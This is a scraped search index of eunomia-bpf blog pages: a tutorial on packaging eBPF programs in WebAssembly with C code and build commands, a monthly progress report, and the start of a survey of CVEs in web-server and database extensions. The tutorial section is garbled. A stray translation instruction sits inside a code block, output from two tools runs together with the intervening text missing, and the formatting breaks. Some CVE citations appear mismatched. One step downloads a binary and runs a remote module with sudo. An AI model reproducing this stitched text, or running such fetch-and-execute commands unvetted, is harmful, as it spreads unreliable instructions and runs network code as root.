https://github.com/eunomia-bpf/bpf-developer-tutorial and our tutorials at https://eunomia.dev/tutorials/ for practical understanding and practice. The original text of this article is from https://eunomia.dev/blogs/ebpf-security, welcome to star and follow us.</p> <p>Share on  Share on </p>"},{"location":"blog/2023/06/11/when-wasm-meets-ebpf-writing-distributing-loading-and-running-ebpf-programs-with-webassembly/","title":"When Wasm Meets eBPF: Writing, Distributing, Loading, and Running eBPF Programs with WebAssembly","text":"<p>In today's cloud-native world, eBPF and WebAssembly are two of the hottest lightweight code execution sandboxes/virtual machines. Both of them run high-performance bytecode programs compiled from languages such as C, C++, and Rust, and both are cross-platform and portable. The biggest difference between them is that eBPF runs in the Linux kernel, while WebAssembly runs in user space. We want to make an attempt to integrate them: using Wasm to write universal eBPF programs that can be distributed to different versions and architectures of Linux kernels without the need for recompiling.</p>"},{"location":"blog/2023/06/11/when-wasm-meets-ebpf-writing-distributing-loading-and-running-ebpf-programs-with-webassembly/#webassembly-vs-ebpf","title":"WebAssembly vs. eBPF","text":"<p>WebAssembly (abbreviated as Wasm) is a binary instruction format based on a stack-based virtual machine. Wasm is designed for a portable target and can be used as a compilation target for high-level languages such as C/C++/Rust to enable the deployment of client-side and server-side applications on the Web. Wasm has multiple runtime implementations, including browsers and standalone systems, and it can be used in applications such as video and audio codecs, graphics and 3D, multimedia and gaming, cryptographic calculations, or portable language implementations.</p> <p>Although Wasm was designed as a bytecode standard to improve the performance of performance-sensitive modules on the web, it can be used not only in browsers but also in other environments. Wasm has evolved into a lightweight, high-performance, cross-platform, and multi-language software sandbox environment used in cloud-native software components. Compared to Linux containers, WebAssembly has a startup speed that is 100 times faster, consumes less memory and disk space, and has a better-defined security sandbox. However, the trade-off is that WebAssembly requires its own language SDK and compiler toolchain, making it a more constrained development environment compared to Linux containers. WebAssembly is increasingly being used in edge computing scenarios where deploying Linux containers or application performance is critical.</p> <p>The compilation and deployment process of Wasm is as follows:</p> <p></p> <p>Usually, high-level languages such as C/C++/Rust can be compiled into Wasm bytecode and then loaded and executed in the Wasm virtual machine. The Wasm virtual machine will interpret or JIT the Wasm bytecode into machine code for the corresponding platform (such as x86/arm) to run.</p> <p>eBPF originated from BPF and is essentially an efficient and flexible virtual machine component in the kernel that executes bytecode in a secure manner at various kernel hook points. Originally designed for efficient network packet filtering, BPF has evolved into a top-level subsystem in the kernel and has become a general-purpose execution engine. Developers can use eBPF to develop performance analysis tools, software-defined networks, security, and many other scenarios. eBPF has some programming restrictions and needs to be validated to ensure its safety in the kernel application scenarios (e.g., no infinite loops, out-of-bounds memory access, etc.), but this also means that the programming model of eBPF is not Turing complete. In contrast, WebAssembly is a Turing complete language with extensions like WebAssembly System Interface (WASI) that can break out of the sandbox and access native OS libraries. At the same time, the Wasm runtime can safely isolate and execute user space code with performance close to native code. There are many differences between the two in terms of their main domains, but there are also many overlapping areas.</p> <p>There have been attempts to run WebAssembly in the Linux kernel, but they have generally not been successful. eBPF is a better choice for this use case. However, WebAssembly programs can handle many kernel-like tasks and can be compiled ahead of time (AOT) into native applications. WasmEdge Runtime from CNCF is a great LLVM-based cloud-native WebAssembly compiler. Native applications consolidate all sandbox checks into native libraries, allowing WebAssembly programs to behave like standalone \"library operating systems.\" In addition, these AOT-compiled sandboxed WebAssembly applications can run on microkernel operating systems like seL4 and take over many \"kernel-level\" tasks[1].</p> <p>While WebAssembly can be brought down to the kernel level, eBPF can also be brought up to the application level. In the sidecar proxy, Envoy Proxy pioneered the use of WebAssembly as an extension mechanism for programming the data plane. Developers can write proxy logic for specific applications in languages such as C, C++, Rust, AssemblyScript, Swift, and TinyGo and compile the module into Wasm. With the proxy-Wasm standard, proxies can execute those Wasm plugins in high-performance runtimes such as Wasmtime and WasmEdge[2].Although many applications currently use both, most of the time these two virtual machines are independent and have no intersection. For example, in an observability application, data is collected using eBPF probes and then data processing is performed by introducing Wasm plugin modules in user space. The distribution, running, loading, and control of Wasm modules and eBPF programs are independent of each other, with only a data flow association.</p>"},{"location":"blog/2023/06/11/when-wasm-meets-ebpf-writing-distributing-loading-and-running-ebpf-programs-with-webassembly/#our-attempt","title":"Our Attempt","text":"<p>Generally speaking, a complete eBPF application consists of two parts: user space programs and kernel programs:</p> <ul> <li>User space programs are responsible for loading BPF bytecode into the kernel or reading statistical information or event details returned by the kernel for relevant data processing and control.</li> <li>The BPF bytecode in the kernel is responsible for executing specific events in the kernel and may send the execution results to user space through maps or perf-event events.</li> </ul> <p>User space programs can control some parameters and variables of eBPF programs as well as mounting points before loading eBPF programs. They can also communicate bidirectionally between user space and kernel space through maps and other methods. Usually, user space eBPF programs can be developed based on the <code>libbpf</code> library to control the loading and running of kernel space eBPF programs. So, if all the control and data processing logic in user space is moved to the Wasm virtual machine, the eBPF bytecode can be packaged and distributed through the Wasm module, and the loading and execution of the entire eBPF program can be controlled internally in the Wasm virtual machine. Perhaps we can combine the advantages of both and allow any eBPF program to have the following features:</p> <ul> <li><code>Portability</code>: Make eBPF tools and applications completely platform-independent and portable, without the need for recompilation to distribute across platforms.</li> <li><code>Isolation</code>: With the reliability and isolation of Wasm, make the loading and execution of eBPF programs and the user space data processing flow more secure and reliable. In fact, the user space control code of an eBPF application is usually much larger than the kernel space code.</li> <li><code>Package Management</code>: With the ecosystem and toolchain of Wasm, complete the distribution, management, and loading of eBPF programs or tools. Currently, the eBPF program or tool ecosystem may lack a universal package management or plugin management system.</li> <li><code>Cross-Language</code>: Currently, eBPF programs are developed in various user space languages \u200b\u200b(such as Go\\Rust\\C\\C++\\Python, etc.). More than 30 programming languages \u200b\u200bcan be compiled into WebAssembly modules, allowing developers from various backgrounds (C, Go, Rust, Java, TypeScript, etc.) to write user space eBPF programs in their chosen language without the need to learn a new language.</li> <li><code>Agility</code>: For large eBPF applications, Wasm can be used as a plugin extension platform: extension programs can be delivered and reloaded directly from the control plane at runtime. This means that everyone can use official and unmodified applications to load custom extensions, and any errors and/or updates to any eBPF program can be pushed and/or tested at runtime without the need to update and/or redeploy a new binary.</li> <li><code>Lightweight</code>: WebAssembly microservices consume 1% of resources and have a cold start time of 1% compared to Linux container applications. With this, we may be able to implement eBPF as a service, making the loading and execution of eBPF programs more lightweight, fast, and easy.</li> </ul> <p>eunomia-bpf is a project started and incubated in the \"eBPF Technology Exploration SIG\" [3] [5]. It is also open source on Github [4]. eunomia-bpf is a lightweight development and loading framework for eBPF programs, containing a user space dynamic loading framework/runtime library and a simple toolchain container for compiling Wasm and eBPF bytecode. In fact, writing eBPF code in a Wasm module is basically the same as using the libbpf framework or Coolbpf to develop eBPF programs in the usual familiar way. The complexity of Wasm is hidden in the compilation toolchain and runtime library of eunomia-bpf. Developers can focus on the development and debugging of eBPF programs without the need to understand the background knowledge of Wasm or worry about Wasm's compilation environment configuration.</p>"},{"location":"blog/2023/06/11/when-wasm-meets-ebpf-writing-distributing-loading-and-running-ebpf-programs-with-webassembly/#distributing-and-dynamically-loading-ebpf-programs-with-wasm-modules","title":"Distributing and Dynamically Loading eBPF Programs with Wasm Modules","text":"<p>The eunomia-bpf library includes a simple command-line tool (ecli) that contains a small Wasm runtime module and the ability to dynamically load eBPF. It can be downloaded and used directly:</p> <pre><code># download the release from https://github.com/eunomia-bpf/eunomia-bpf/releases/latest/download/ecli\n$ wget https://aka.pw/bpf-ecli -O ecli &amp;&amp; chmod +x ./ecli\n$ sudo ./ecli run https://eunomia-bpf.github.io/eunomia-bpf/sigsnoop/app.wasm\"Instructions: Translate the following Chinese text to English \nwhile maintaining the original formatting: \"2022-10-11 14:05:50 URL:https://eunomia-bpf.github.io/eunomia-bpf/sigsnoop/app.wasm [70076/70076] -&gt; \"/tmp/ebpm/app.wasm\" [1]\nrunning and waiting for the ebpf events from perf event...\n{\"pid\":1709490,\"tpid\":1709077,\"sig\":0,\"ret\":0,\"comm\":\"node\",\"sig_name\":\"N/A\"}\n{\"pid\":1712603,\"tpid\":1717412,\"sig\":2,\"ret\":0,\"comm\":\"kworker/u4:3\",\"sig_name\":\"SIGINT\"}\n{\"pid\":1712603,\"tpid\":1717411,\"sig\":2,\"ret\":0,\"comm\":\"kworker/u4:3\",\"sig_name\":\"SIGINT\"}\n{\"pid\":0,\"tpid\":847,\"sig\":14,\"ret\":0,\"comm\":\"swapper/1\",\"sig_name\":\"SIGALRM\"}\n{\"pid\":1709490,\"tpid\":1709077,\"sig\":0,\"ret\":0,\"comm\":\"node\",\"sig_name\":\"N/A\"}\n{\"pid\":1709139,\"tpid\":1709077,\"sig\":0,\"ret\":0,\"comm\":\"node\",\"sig_name\":\"N/A\"}\n{\"pid\":1717420,\"tpid\":1717419,\"sig\":17,\"ret\":0,\"comm\":\"cat\",\"sig_name\":\"SIGCHLD\"}`\"ts\":0,\"pid\":2344,\"uid\":0,\"ret\":26,\"flags\":0,\"comm\":\"YDService\",\"fname\":\"/proc/1718823/cmdline\"}`\n`{\"ts\":0,\"pid\":2344,\"uid\":0,\"ret\":26,\"flags\":0,\"comm\":\"YDService\",\"fname\":\"/proc/1718824/cmdline\"}`\n`{\"ts\":0,\"pid\":2344,\"uid\":0,\"ret\":26,\"flags\":0,\"comm\":\"YDService\",\"fname\":\"/proc/self/stat\"}`\n\nopensnoop tracks the `open()` system call of a process, which means all file opening operations in the kernel. Here we can see process information such as PID, UID, return value, flags, process name, and file name. The eBPF program in kernel space is distributed within a Wasm module and is relocated using BTF information and libbpf during loading to adapt to different kernel versions. Additionally, because the user-space related processing code is entirely written in Wasm and the kernel-space is written in eBPF instructions, it is not restricted by specific instruction sets (e.g., x86, ARM) and can run on different platforms.\n\n### Developing and Packaging eBPF Programs with Wasm\n\nSimilarly, taking the example of sigsnoop mentioned earlier for tracking signal sending and receiving of a process, we first need to write the eBPF code in the kernel space in `sigsnoop.bpf.c`:\n\n```c\n#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include \"sigsnoop.h\"\n\nconst volatile pid_t filtered_pid = 0;\n.....\n\nstruct {\n __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);\n __uint(key_size, sizeof(__u32));\n __uint(value_size, sizeof(__u32));\n} events SEC(\".maps\");\n\nSEC(\"tracepoint/signal/signal_generate\")\nint sig_trace(struct trace_event_raw_signal_generate *ctx)\n{\n struct event event = {};\n pid_t tpid = ctx-&gt;pid;\n int ret = ctx-&gt;errno;\n int sig = ctx-&gt;sig;\n __u64 pid_tgid;\n __u32 pid;\n\n ...\n pid_tgid = bpf_get_current_pid_tgid();\n pid = pid_tgid &gt;&gt; 32;\n if (filtered_pid &amp;&amp; pid != filtered_pid)\n  return 0;\n\n event.pid = pid;\n event.tpid = tpid;\n event.sig = sig;\n event.ret = ret;\n bpf_get_current_comm(event.comm, sizeof(event.comm));\n bpf_perf_event_output(ctx, &amp;events, BPF_F_CURRENT_CPU, &amp;event, sizeof(event));\n return 0;\n}\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n</code></pre> <p>Here, we use the <code>tracepoint/signal/signal_generate</code> tracepoint to track the signal generation events in the kernel. The kernel code exports information to user space using <code>BPF_MAP_TYPE_PERF_EVENT_ARRAY</code>. Therefore, we need to define a structure for exporting information in the <code>sigsnoop.h</code> header file:</p> <pre><code>#ifndef __SIGSNOOP_H\n#define __SIGSNOOP_H\n\n#define TASK_COMM_LEN 16\n\nstruct event {\n unsigned int pid;\n unsigned int tpid;\n int sig;\n int ret;\n char comm[TASK_COMM_LEN];\n};\n\n#endif /* __SIGSNOOP_H */\n</code></pre> <p>We can compile it into JSON format using the eunomia-bpf toolchain, generate a <code>package.json</code> file, and directly run it using the ecli command:</p> <p><code>console\".</code>console $ docker run -it -v <code>pwd</code>/:/src/ ghcr.io/eunomia-bpf/ecc-<code>uname -m</code>:latest make   BPF      .output/client.bpf.o   GEN-SKEL .output/client.skel.h   CC       .output/client.o   CC       .output/cJSON.o   CC       .output/create_skel_json.o   BINARY   client   DUMP_LLVM_MEMORY_LAYOUT   DUMP_EBPF_PROGRAM   FIX_TYPE_INFO_IN_EBPF   GENERATE_PACKAGE_JSON</p> <p>$ sudo ./ecli run package.json running and waiting for the ebpf events from perf event... time pid tpid sig ret comm 14:39:39 1723835 1723834 17 0 dirname 14:39:39 1723836 1723834 17 0 chmod 14:39:39 1723838 1723837 17 0 ps 14:39:39 1723839 1723837 17 0 grep 14:39:39 1723840 1723837 17 0 grep 14:39:39 1723841 1723837 17 0 wc</p> <pre><code>All of our build toolchains have been packaged as Docker images and published to Docker Hub, \nso they can be used directly. At this time, only the kernel-space eBPF code and some auxiliary information are dynamically loaded and executed, \nhelping the eunomia-bpf library automatically obtain events reported from kernel-space to user-space. \nIf we want to perform some parameter configuration and adjustment in user-space, as well as data processing, \nwe need to write code in user-space and package the kernel-space eBPF code and user-space code into a complete eBPF program.\n\nA one-liner command can directly generate a user-space WebAssembly development framework for eBPF programs:\n\n```console\n$ docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest gen-wasm-skel\nmake\n  GENERATE_PACKAGE_JSON\n  GEN-Wasm-SKEL\n$ ls\napp.c eunomia-include ewasm-skel.h package.json README.md  sigsnoop.bpf.c  sigsnoop.h\n</code></pre> <p>The Wasm development framework we provide is written in C and includes the following files:</p> <ul> <li>ewasm-skel.h: the header file of the user-space WebAssembly development framework,   which contains the pre-compiled eBPF program bytecode and the eBPF program framework auxiliary information for dynamic loading;</li> <li>eunomia-include: some header-only library functions and auxiliary files to assist development;</li> <li>app.c: the main code of the user-space WebAssembly program, which includes the main logic of the eBPF program and the data processing flow of the eBPF program.</li> </ul> <p>Take <code>sigsnoop</code> as an example. In user-space, it includes some code for command line parsing, configuring the eBPF program, and data processing. It adds the English names of signal events based on the signal number:</p> <pre><code>....\nint main(int argc, const char** argv)\n{\n  struct argparse_option options[] = {\n        OPT_HELP(),\n        OPT_BOOLEAN('x', \"failed\", &amp;failed_only, \"failed signals only\", NULL, 0, 0),\n        OPT_BOOLEAN('k', \"killed\", &amp;kill_only, \"kill only\", NULL, 0, 0),\n        OPT_INTEGER('p', \"pid\", &amp;target_pid, \"target pid\", NULL, 0, 0),\n  OPT_INTEGER('s', \"signal\", &amp;target_signal, \"target signal\", NULL, 0, 0),\n        OPT_END(),\n    };\n\n  struct argparse argparse;\n  argparse_init(&amp;argparse, options, usages, 0);\n  argparse_describe(&amp;argparse, \"Trace standard and real-time signals.\\n\", \"\");\n  argc = argparse_parse(&amp;argparse, argc, argv);\n\n  cJSON *program = cJSON_Parse(program_data);\n  program = set_bpf_program_global_var(program, \"filtered_pid\", cJSON_CreateNumber(target_pid));\n  program = set_bpf_program_global_var(program, \"target_signal\", cJSON_CreateNumber(target_signal));\n  program = set_bpf_program_global_var(program, \"failed_only\", cJSON_CreateBool(failed_only));\n  return start_bpf_program(cJSON_PrintUnformatted(program));\n}\n\nint process_event(int ctx, char *e, int str_len)\n{\n cJSON *json = cJSON_Parse(e);\n int sig = cJSON_GetObjectItem(json, \"sig\")-&gt;valueint;\n const char *name = sig_name[sig];\n cJSON_AddItemToObject(json, \"sig_name\", cJSON_CreateString(name));\n char *out = cJSON_PrintUnformatted(json);\n printf(\"%s\\n\", out);\n return 0;\n}\n</code></pre> <p>Finally, the use of container images can complete the compilation and packaging of WebAssembly/eBPF programs in one command. Use ecli to run with one click:</p> <pre><code>$ docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest build-wasm\nmake\n  GENERATE_PACKAGE_JSON\n  BUILD-Wasm\nbuild app.wasm success\n$ sudo ./ecli run app.wasm -h\nUsage: sigsnoop [-h] [-x] [-k] [-n] [-p PID] [-s SIGNAL]\n</code></pre> <p>Since we use the libbpf framework to load and start eBPF programs based on one-time compilation and universal execution, the compilation and execution steps are completely separate. eBPF programs can be distributed and deployed directly over the network or any other means, without relying on specific kernel versions. With the lightweight nature of WebAssembly, the startup speed of eBPF programs is also much faster than that of libbpf programs distributed in image form, usually taking less than 100 ms to complete. Compared to the time and resources consumed by LLVM and Clang for compiling and running when deploying and starting with BCC, it is a qualitative leap.</p> <p>For the complete code of the example program mentioned above, you can refer to here [6].</p>"},{"location":"blog/2023/06/11/when-wasm-meets-ebpf-writing-distributing-loading-and-running-ebpf-programs-with-webassembly/#demo-video","title":"Demo video","text":"<p>We also have a demonstration video on Bilibili, which demonstrates how to port an eBPF tool program from bcc/libbpf-tools to eunomia-bpf and distribute and load eBPF programs using Wasm or JSON files: https://www.bilibili.com/video/BV1JN4y1A76k</p>"},{"location":"blog/2023/06/11/when-wasm-meets-ebpf-writing-distributing-loading-and-running-ebpf-programs-with-webassembly/#how-we-did-it","title":"How we did it","text":"<p><code>ecli</code> is a simple command-line tool based on our underlying eunomia-bpf library and runtime implementation. Our project architecture is shown in the following diagram:</p> <p></p> <p>The <code>ecli</code> tool is implemented based on the <code>ewasm</code> library, which includes a WAMR (wasm-micro-runtime) runtime and an eBPF dynamic loading module built on the libbpf library. In general, we added a layer of abstraction (eunomia-bpf library) between the <code>Wasm</code> runtime and user-space <code>libbpf</code>, so that eBPF code that can be compiled and run once can be dynamically loaded from a JSON object. The JSON object is included in the Wasm module at compile time, so at runtime, we can parse the JSON object to retrieve information about the eBPF program and then dynamically load the eBPF program.The process of compiling and distributing eBPF programs using Wasm or JSON can be roughly summarized as follows:</p> <p></p> <p>In general, the writing and loading of the entire eBPF program can be divided into three parts:</p> <ol> <li>Use the eunomia-cc toolchain to compile the eBPF code skeleton and bytecode of the kernel into JSON format.</li> <li>Embed JSON data in a high-level language (such as C) developed in user space, and provide some APIs to manipulate the JSON-formatted eBPF program skeleton.</li> <li>Compile the user space program and JSON data into Wasm bytecode and package it as a Wasm module, then load and run the Wasm program on the target machine.</li> <li>Load the embedded JSON data from the Wasm module and dynamically load and configure the eBPF program skeleton using the eunomia-bpf library.</li> </ol> <p>What we need to do is only a small amount of native API and Wasm runtime bindings, and process JSON data in Wasm code. You can have multiple eBPF programs in a single Wasm module. If you don't want to use our provided Wasm runtime or want to develop user-space eBPF auxiliary code in another language, you can complete some WebAssembly bindings based on our eunomia-bpf library.</p> <p>In addition, for the eunomia-bpf library, it is not necessary to have a Wasm module and runtime to start and dynamically load eBPF programs. In this case, only the bytecode of the eBPF program in kernel space will be dynamically loaded and run. You can manually or using any language modify the JSON object to control the loading and parameters of the eBPF program, and obtain the returned data automatically through eunomia-bpf. For beginners, this may be simpler and more convenient than using WebAssembly: just write the eBPF program in kernel space, then use the eunomia-cc toolchain to compile it into JSON format, and finally load and run it using the eunomia-bpf library. There is no need to consider any user-space auxiliary programs, including WebAssembly. For specific details, please refer to our user manual [7] or sample code [8].</p>"},{"location":"blog/2023/06/11/when-wasm-meets-ebpf-writing-distributing-loading-and-running-ebpf-programs-with-webassembly/#future-directions","title":"Future directions","text":"<p>Currently, the implementation of the eunomia-bpf toolchain is far from perfect, there is only a version for feasibility verification. For a development toolchain, specific API standards and related ecosystems are very important. If there is an opportunity, we hope that we can discuss with other members of the SIG community to form a specific API standard, which can provide a common, cross-platform, and kernel version plugin ecosystem based on technologies such as eBPF and Wasm, to add eBPF and Wasm capabilities to their respective applications.</p> <p>Currently, the cross-kernel version dynamic loading feature of eunomia-bpf depends on the BTF information of the kernel. The Coolbpf project [9] of the SIG community itself can provide automatic generation of BTF and adaptation for low version kernels. Future support for low version kernels will be based on the existing part of Coolbpf. At the same time, we will provide similar features to the eunomia-bpf library for the Coolbpf API implementation and remote compilation backend, so that programs developed using the Coolbpf API can be used directly on any kernel version and architecture after remote compilation, without the need to connect to remote servers again during deployment. The compiled eBPF program can also be used directly as a development package for languages such as Go, Python, and Rust, allowing developers to easily obtain the information reported by the eBPF program without the need for any compilation process for the eBPF program.</p> <p>The SIG community is incubated in the Linux Microscope (LMP) project [10] in universities, and there are also plans to provide common, standardized, downloadable and runnable eBPF programs or tool libraries based on eunomia-bpf, which are currently being further improved.</p>"},{"location":"blog/2023/06/11/when-wasm-meets-ebpf-writing-distributing-loading-and-running-ebpf-programs-with-webassembly/#references","title":"References","text":"<ol> <li>eBPF and WebAssembly: Which VM Will Dominate the Cloud-Native Era? https://juejin.cn/post/7043721713602789407</li> <li>eBPF and Wasm: Exploring the Future of the Service Mesh Data Plane: https://cloudnative.to/blog/ebpf-wasm-service-mesh/</li> <li>eBPF Technology Exploration SIG Homepage: https://openanolis.cn/sig/ebpfresearch</li> <li>eunomia-bpf GitHub repository: https://github.com/eunomia-bpf/eunomia-bpf.5. eunomia-bpf Mirror Repository: https://gitee.com/anolis/eunomia</li> <li>sigsnoop Sample Code: https://gitee.com/anolis/eunomia/tree/master/examples/bpftools/sigsnoop</li> <li>eunomia-bpf User Manual: https://openanolis.cn/sig/ebpfresearch/doc/646023027267993641</li> <li>More Sample Code: https://gitee.com/anolis/eunomia/tree/master/examples/bpftools/sigsnoop</li> <li>Coolbpf Project Introduction: https://openanolis.cn/sig/ebpfresearch/doc/633529753894377555</li> <li>LMP Project Introduction: https://openanolis.cn/sig/ebpfresearch/doc/633661297090877527</li> </ol> <p>Share on  Share on </p>"},{"location":"blog/2023/03/11/progress-of-eunomia-bpf-in-march/","title":"Progress of eunomia-bpf in March","text":"<p>The eunomia-bpf project is an open-source project aimed at providing a set of tools for writing and running eBPF programs more conveniently in the Linux kernel. In the past month, the project has made some new progress. Here is an overview of these advances.</p> <p>Firstly, the eunomia-bpf dynamic loading library has undergone some important updates. The library now supports the btf hub, which makes it easier to port eBPF programs on low kernel versions. The ecli program has also been completely rewritten and is now written in Rust, replacing the original version written in C++. In addition, the library has fixed the output issue when using JSON to dynamically load eBPF programs and automatically publishes Docker images in CI.</p> <p>Secondly, the Wasm-bpf project has also been updated. The project has added a series of examples that focus on security, networking, tracing, and other areas. The Wasm-bpf project has also added support for the Guest SDK in the Rust language and attempted to add support for the Guest SDK in the Go language. The runtime implementation of Rust and wasmtime has also been included in the project, and a runtime plugin has been added for WasmEdge. Furthermore, the project has undergone a series of fixes and documentation refactoring and has improved CI and testing. The project has also attempted to use the Wasm component model and added a tool for adding table exports defined in the wasm module. Lastly, the project has produced three blog posts and demonstration videos.</p> <p>Lastly, eunomia-bpf has added a new demo project called GPTtrace. This project uses ChatGPT to automate the generation of eBPF programs and tracing, making it easier for users to create and trace custom system events. The project has also updated the tutorial documentation to make it easier to use.</p> <p>Overall, the eunomia-bpf project has made significant progress in March. These updates and improvements make the project more user-friendly and flexible, expanding its functionality and scope. If you are interested in the project, you can follow its latest developments and updates.</p> <p>Here is a more detailed list of updates:</p> <ul> <li>eunomia-bpf dynamic loading library</li> <li>Added support for the btf hub, allowing better portability of eBPF programs on low kernel versions link</li> <li>Completely replaced the version written in C++ with ecli written in Rust link</li> <li>Fixed the output issue when using JSON to dynamically load eBPF programs link link</li> <li>Automatically publishes Docker images in CI link link</li> <li>Tried to add support on other platforms and performed more testing on RISC-V link</li> <li>Wasm-bpf</li> <li>Added a series of examples focusing on security, networking, tracing, and more link link link</li> <li>Added support for the Guest SDK in the Rust language link</li> <li>Attempted to add support for the Guest SDK in the Go language link</li> <li>Added the runtime implementation of Rust and wasmtime link</li> <li>Added a runtime plugin for WasmEdge link.- A series of minor fixes and documentation refactorings link link link link link</li> <li>Improvement of CI, testing, etc. link link</li> <li>Attempt of Wasm component model link</li> <li>A tool to add an export of the table defined in the wasm module link</li> <li>Production of three blogs and demo videos, etc.</li> <li>New demo project: GPTtrace: Generate eBPF programs and tracing with ChatGPT and natural language link</li> <li>Improvement of tutorial documentation: link</li> </ul> <p>Share on  Share on </p>"},{"location":"blog/2025/02/10/security-vulnerabilities-study-in-software-extensions-and-plugins/","title":"Security Vulnerabilities Study in Software Extensions and Plugins","text":""},{"location":"blog/2025/02/10/security-vulnerabilities-study-in-software-extensions-and-plugins/#introduction","title":"Introduction","text":"<p>Software extensions and plugins allow customization and added features across many systems \u2013 from web servers and databases to browsers, IDEs, and CMS platforms. However, these extensibility mechanisms introduce security risks. Extensions often run with high privileges inside host applications, so a flaw in an extension can compromise the entire system ([PDF] Protecting Browsers from Extension Vulnerabilities - Google Research). Common vulnerability types include memory safety issues (buffer/stack overflows and heap corruptions), privilege escalations, sandbox escapes, infinite loops or livelocks causing Denial-of-Service, and arbitrary code execution (ACE). This report examines historical and recent vulnerabilities in extensions/plugins across various ecosystems, highlighting notable CVEs, trends, case studies of major incidents, and how improved security models like an Extension Interface Model (EIM) could mitigate such issues. </p>"},{"location":"blog/2025/02/10/security-vulnerabilities-study-in-software-extensions-and-plugins/#web-server-extensions-nginx-apache-etc","title":"Web Server Extensions (Nginx, Apache, etc.)","text":"<p>Web servers support modules (extensions) for added functionality (e.g. SSL, scripting, media handling). These modules are typically native code loaded into the server process, so any vulnerability can crash or hijack the server. Memory safety issues are prominent: for example, an integer underflow in Apache\u2019s mod_lua (Lua scripting module) led to a buffer overflow in its multipart request parser (CVE-2021-44790) (1). This flaw can be triggered by a crafted request body, potentially allowing remote code execution or at least a process crash. Nginx\u2019s modules have likewise had buffer errors \u2013 e.g. a recent bug in the Nginx MP4 streaming module allowed an attacker to over-read memory and crash a worker process (CVE-2024-7347) (2). In both cases, the module\u2019s memory mismanagement risks the stability and security of the entire web server.</p> <p>Extensions can also introduce Denial-of-Service vulnerabilities. A notable case is the HTTP/2 module in Nginx (ngx_http_v2_module): certain malicious HTTP/2 sequences could trigger a livelock with 100% CPU usage, starving other requests (3). For instance, an attacker sending a flood of HTTP/2 PRIORITY frames (CVE-2019-9513) could tie up Nginx\u2019s worker in a resource loop, effectively causing an outage (3). Similar HTTP/2 issues (CVE-2019-9511, CVE-2019-9516) caused excessive memory and CPU consumption in Nginx (4). These flaws in extension modules demonstrate how infinite loops or heavy computational cycles in extensions can bring down a server (a livelock), even without compromising code execution. </p> <p>While less common, privilege escalation can occur if a web server module doesn\u2019t properly isolate privileges. For example, older Apache modules have had logic bugs that allowed local users to gain root via the module, though core Apache vulnerabilities (like CVE-2019-0211 in Apache prefork) are more typical for priv-esc. More frequently, extension vulnerabilities lead to arbitrary code execution. Memory corruption in a module can be leveraged to run attacker-controlled code with the server\u2019s privileges. The mod_lua overflow mentioned above was deemed Critical (CVSS 9.8) specifically because it could lead to code execution in Apache\u2019s context (5: CVE-2021-44790: Code Execution on Apache via an Integer ...). In Nginx, third-party modules written in C (e.g. authentication or Lua modules in OpenResty) have had buffer overflow bugs causing crashes and potential ACE. For instance, an off-by-one error in a custom Nginx Lua plugin could corrupt memory and crash the worker (though not always assigned a CVE if third-party). </p> <p>Notable CVEs \u2013 Web Server Extensions: - CVE-2021-44790 (Apache mod_lua): Buffer overflow in mod_lua\u2019s multipart parser via crafted request, leading to crash or potential RCE (1). - CVE-2024-7347 (Nginx ngx_http_mp4_module): Buffer over-read in MP4 streaming module allowing attacker to read out-of-bounds memory and crash a worker (2). - CVE-2019-9513 (Nginx HTTP/2 module): Resource loop (livelock) triggered by abusing HTTP/2 PRIORITY frames, causing excessive CPU usage (DoS) (3: CVE-2019-9513 - Red Hat Customer Portal). - CVE-2017-7529 (Nginx range filter): (Historical) Integer overflow in Nginx range request module causing leak of memory contents (6: CVE-2019-9513 - Ubuntu) (information disclosure). - CVE-2018-1301 (Apache mod_authnz): (Historical) Stack buffer overflow in Apache mod_authnz LDAP due to improper input length handling, could lead to ACE.  </p> <p>(Note: CVEs marked historical illustrate the longstanding nature of module memory issues, though focus is on recent years.)</p>"},{"location":"blog/2025/02/10/security-vulnerabilities-study-in-software-extensions-and-plugins/#database-extensions-redis-postgresql-mysql-etc","title":"Database Extensions (Redis, PostgreSQL, MySQL, etc.)","text":"<p>Modern databases often allow extensions or modules to extend functionality \u2013 for example, Redis allows loading modules in C and uses embedded Lua for scripting, and PostgreSQL/MySQL support extensions or user-defined functions. These powerful extension interfaces have introduced severe vulnerabilities. </p> <p>Memory safety bugs in database extensions can yield remote code execution or crashes. A recent critical example is Redis CVE-2024-31449: an authenticated user could execute a specially crafted Lua script that triggers a stack-based buffer overflow in Redis\u2019s built-in Lua bitop library, leading to possible remote code execution (7). In this case, the sandboxed Lua engine itself had a C implementation flaw, so a malicious script could escape the normal sandbox restrictions by corrupting memory. Similarly, Redis\u2019s module system (Redis Modules are compiled C plugins) has seen vulnerabilities \u2013 e.g., a heap overflow in the RediSearch module\u2019s kNN (nearest neighbor) command processing (CVE-2024-51737) could be triggered by a crafted argument, leading to a heap memory overflow and potential RCE (8). These illustrate that both embedded scripting and compiled modules in databases carry memory corruption risks.</p> <p>Privilege escalation issues are also a concern in database extensions. PostgreSQL, for instance, has had vulnerabilities in third-party extensions that allowed unprivileged users to gain superuser rights within the database. An example is CVE-2023-32305 in the aiven-extras extension for PostgreSQL: versions before 1.1.9 contained a flaw that allowed a database user to escalate privileges to superuser by exploiting the extension\u2019s features (9). Another example is an issue in the PostgreSQL Anonymizer extension (v1.2) which allowed SQL injection that could elevate a user owning a table to superuser when certain features were enabled (10). These extension weaknesses effectively break the database\u2019s permission model, as a compromised extension can bypass normal access controls.</p> <p>Database extensions can also suffer from sandbox escape or logic errors. In theory, extensions like PostgreSQL\u2019s procedural languages (PL/pgSQL, PL/Perl, etc.) run in a restricted context, but bugs in their implementation can allow escaping those restrictions. MySQL\u2019s User-Defined Functions (UDFs) \u2013 essentially plugins \u2013 have historically allowed code execution if an attacker could create a malicious UDF library, though that requires file system access (less a vulnerability, more a misuse scenario). A more direct sandbox escape example is again the Redis Lua case: the Lua interpreter is intended to be sandboxed (no direct OS calls), but the buffer overflow in the C layer broke out of the intended script sandbox, allowing native code execution in the Redis server process (7).</p> <p>Another class of issues is Denial-of-Service via infinite loops or heavy computation in extensions. For instance, Redis is single-threaded; a poorly written Redis module or a malicious Lua script containing an infinite loop will block the entire server. Redis mitigates this by enforcing a script execution 